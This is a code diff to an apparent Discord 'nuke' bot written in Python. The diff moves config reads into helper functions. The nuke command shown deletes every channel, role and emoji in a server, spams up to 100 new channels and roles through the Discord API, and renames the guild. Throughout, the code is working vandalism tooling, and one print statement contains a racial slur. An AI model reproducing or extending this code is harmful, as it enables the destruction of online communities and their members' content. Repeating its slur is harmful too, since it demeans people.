@@ -1,15 +1,35 @@
-import discord, asyncio, time, json
+import asyncio, time, json
 from aiohttp import *
 from discord.ext import commands as dortrox
-global ban
 fObj = open('config.json',)
 ogdata = json.load(fObj)
 token = ogdata['token']
-ban = ogdata['ban']
 uagent = ogdata['uagent']
-channel_json = ogdata['channel_json']
-role_json = ogdata['role_json']
 headers = {'User-Agent': uagent, 'Authorization': token }
+
+async def guildName():
+  fObj = open('config.json')
+  ogdata = json.load(fObj)
+  name = ogdata['guild']['guildName']
+  return name
+
+async def channelName():
+  fObj = open('config.json')
+  ogdata = json.load(fObj)
+  name = ogdata['guild']['channel_json']
+  return name
+
+async def roleName():
+  fObj = open('config.json')
+  ogdata = json.load(fObj)
+  name = ogdata['guild']['role_json']
+  return name
+
+async def bann():
+  fObj = open('config.json')
+  ogdata = json.load(fObj)
+  name = ogdata['guild']['ban']
+  return name
 
 
 #The nuke beginning: 
@@ -19,29 +39,11 @@ async def cd(channel):
         async with cs.delete(f'https://discord.com/api/v8/channels/{channel}') as r:
             if r.status == 200 or r.status == 201 or r.status == 204:
                 print(f'Deleted Channel {channel}')
-                global i
-                i+=1
-                print(i)
             elif r.status == 429:
                 print("nigg")
                 await time.sleep(3)
             else:
                 print(f'{r.status}')
-
-async def cs(ctx):
-    guild = ctx.guild.id
-    async with ClientSession(headers=headers) as cs:
-        async with cs.post(f'https://discord.com/api/v8/guilds/{guild}/channels', json=channel_json) as r:
-            if r.status == 200 or r.status == 201 or r.status == 204:
-                global i
-                i+=1
-                print(i)
-                print(f'Channel Spammed')
-            elif r.status == 429:
-                print("efew")
-                await time.sleep(3)
-            else:
-                print(f'{r.status} Too many request/Not found')
 
 async def ed(ctx, emoji):
     guild = ctx.guild.id
@@ -61,10 +63,22 @@ async def rd(ctx, role):
             else:
                 print(f'{r.status} Too many request/Not found')
 
+async def cs(ctx):
+    guild = ctx.guild.id
+    async with ClientSession(headers=headers) as cs:
+        async with cs.post(f'https://discord.com/api/v8/guilds/{guild}/channels', json=await channelName()) as r:
+            if r.status == 200 or r.status == 201 or r.status == 204:
+                print(f'Channel Spammed')
+            elif r.status == 429:
+                print("efew")
+                await time.sleep(3)
+            else:
+                print(f'{r.status} Too many request/Not found')
+
 async def rs(ctx):
     guild = ctx.guild.id
     async with ClientSession(headers=headers) as cs:
-        async with cs.post(f'https://discord.com/api/v9/guilds/{guild}/roles', json=role_json) as r:
+        async with cs.post(f'https://discord.com/api/v9/guilds/{guild}/roles', json=await roleName()) as r:
             if r.status == 200 or r.status == 201 or r.status == 204:
                 print(f'Spammed role')
             else:
@@ -95,7 +109,7 @@ class nuke(dortrox.Cog):
 
         fObj = open('config.json',)
         ogdata = json.load(fObj)
-        ban = ogdata['ban']
+        ban = await bann()
         try:
             ctx.message.delete
         except:
@@ -116,12 +130,12 @@ class nuke(dortrox.Cog):
                 await ctx.guild.edit(icon=icon)
             except:
                 pass
-        await ctx.guild.edit(name="Rekted By Daddy Dortrox")
+        await ctx.guild.edit(name=await guildName())
         await asyncio.gather(*[cd(channel.id) for channel in ctx.guild.channels])
         time.sleep(2)
-        await asyncio.gather(*[cs(ctx) for _ in range(200)])
+        await asyncio.gather(*[cs(ctx) for _ in range(100)])
         await asyncio.gather(*[rd(ctx, role.id) for role in ctx.guild.roles])
-        await asyncio.gather(*[rs(ctx) for _ in range(200)])
+        await asyncio.gather(*[rs(ctx) for _ in range(100)])
         await asyncio.gather(*[ed(ctx, emoji.id) for emoji in ctx.guild.emojis])
 
     @dortrox.command()
